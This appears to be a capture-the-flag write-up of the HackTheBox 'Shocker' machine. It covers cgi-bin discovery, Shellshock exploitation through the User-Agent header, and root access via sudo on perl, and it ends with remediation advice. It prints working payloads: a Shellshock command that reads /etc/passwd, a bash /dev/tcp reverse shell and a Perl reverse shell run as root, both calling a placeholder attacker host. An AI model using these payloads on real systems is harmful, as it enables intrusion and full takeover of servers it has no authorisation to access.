---
layout: post
title: "HackTheBox — Shocker"
date: 2026-11-07
categories: [HTB, Web]
tags: [shellshock, cve-2014-6271, cgi-bin, rce, sudo, perl, gtfobins]
description: "cgi-bin discovery → Shellshock (CVE-2014-6271) via User-Agent for RCE as shelly → sudo perl to root."
platform: "HackTheBox"
os: "Linux"
difficulty: "Easy"
---

# HackTheBox — Shocker

| Field          | Detail                      |
|----------------|-----------------------------|
| **OS**         | Linux (Ubuntu)              |
| **Difficulty** | Easy                        |
| **Vuln**       | Shellshock (CVE-2014-6271)  |
| **IP**         | 10.129.85.94                |

> Attacker IP redacted throughout as `<ATTACKER_IP>`.

---

## Summary

Shocker is an aptly named Linux box built entirely around the Shellshock bug:

- A near-empty web page hiding an Apache `cgi-bin` directory
- A CGI shell script reachable over HTTP
- Shellshock (CVE-2014-6271) through the `User-Agent` header for RCE
- A reverse shell as `shelly`
- Privilege escalation through a trivially abusable `sudo` entry on `perl`

Outdated Bash plus a CGI script is all it takes to go from an empty page to root.

---

## Reconnaissance

### Port Scan

```bash
nmap -sCV -p- -vv --disable-arp-ping --min-rate 4000 10.129.85.94 -oN fullport.nmap
```

Key findings:

| Port     | State | Service | Version                         |
|----------|-------|---------|---------------------------------|
| 80/tcp   | open  | http    | Apache httpd 2.4.18 (Ubuntu)    |
| 2222/tcp | open  | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 |

SSH sitting on the non-standard port 2222 is a small hint, but the web service is the way in.

### Web Stack

```bash
whatweb 10.129.85.94
```

```text
http://10.129.85.94 [200 OK] Apache[2.4.18], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.85.94]
```

### Inspecting Port 80

```bash
curl 10.129.85.94
```

```html
<!DOCTYPE html>
<html>
<body>
<h2>Don't Bug Me!</h2>
<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">
</body>
</html>
```

Nothing but a picture of a bug — the hint is the page itself.

---

## Content Enumeration

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  -u http://10.129.85.94/FUZZ \
  -e .php,.txt,.sh,.cfg,.config,.bak,.js,.html
```

```text
cgi-bin/   [Status: 403, Size: 295]
```

Apache serving a `cgi-bin` directory is a classic Shellshock indicator. Before jumping to the exploit I enumerated inside it for an executable script:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  -u http://10.129.85.94/cgi-bin/FUZZ \
  -e .php,.txt,.sh,.cfg,.config,.bak,.js,.html
```

```text
user.sh   [Status: 200, Size: 119]
```

A `.sh` CGI script handled by Bash — exactly the condition Shellshock needs.

---

## Exploitation — Shellshock (CVE-2014-6271)

Shellshock lets an attacker smuggle commands into Bash through environment variables. When Apache passes HTTP headers such as `User-Agent` into the CGI environment, a crafted header gets executed by the vulnerable Bash.

### Confirming the Vulnerability

I injected a payload through the `User-Agent` header to read `/etc/passwd`:

```bash
curl -H 'User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd' \
  http://10.129.85.94/cgi-bin/user.sh
```

The server returned the file, confirming code execution:

```text
root:x:0:0:root:/root:/bin/bash
...
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
```

Command execution confirmed, and a real user `shelly` was identified.

### Reverse Shell

I started a listener:

```bash
rlwrap nc -lvnp 4444
```

Then swapped the payload for a bash reverse shell:

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' \
  http://10.129.85.94/cgi-bin/user.sh
```

The connection landed as `shelly`:

```text
shelly@Shocker:/usr/lib/cgi-bin$ id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

The user flag was readable from `shelly`'s home directory.

---

## Privilege Escalation

### Situational Awareness

```bash
whoami   # shelly
groups   # shelly adm cdrom dip plugdev lxd lpadmin sambashare
sudo -l
```

```text
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

`shelly` can run `perl` as root with no password. Perl can spawn arbitrary commands, so this is a direct path to root (a textbook GTFOBins case).

### Perl Reverse Shell as Root

Fresh listener on a new port:

```bash
rlwrap nc -lvnp 9001
```

Executed a Perl reverse shell through `sudo`:

```bash
sudo /usr/bin/perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<ATTACKER_IP>:9001");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

The listener caught a root shell:

```text
Connection received on 10.129.85.94 43064
id
uid=0(root) gid=0(root) groups=0(root)
```

Root achieved, and the root flag was readable.

---

## Conclusion

The complete attack chain was:

1. Content discovery of the Apache `cgi-bin` directory
2. Enumeration of the `user.sh` CGI script
3. Shellshock (CVE-2014-6271) via the `User-Agent` header → RCE
4. Reverse shell as `shelly`
5. `sudo` on `/usr/bin/perl` abused for a root shell

### Remediation

- Patch Bash — CVE-2014-6271 and its follow-ups have been fixed for years; outdated systems remain the only reason Shellshock still works.
- Avoid exposing CGI scripts that invoke Bash; migrate away from `mod_cgi` where possible.
- Never grant `sudo` on interpreters like `perl`, `python`, `ruby` or `awk`; they trivially spawn a root shell. Restrict `sudo` to specific, non-interpretive binaries.
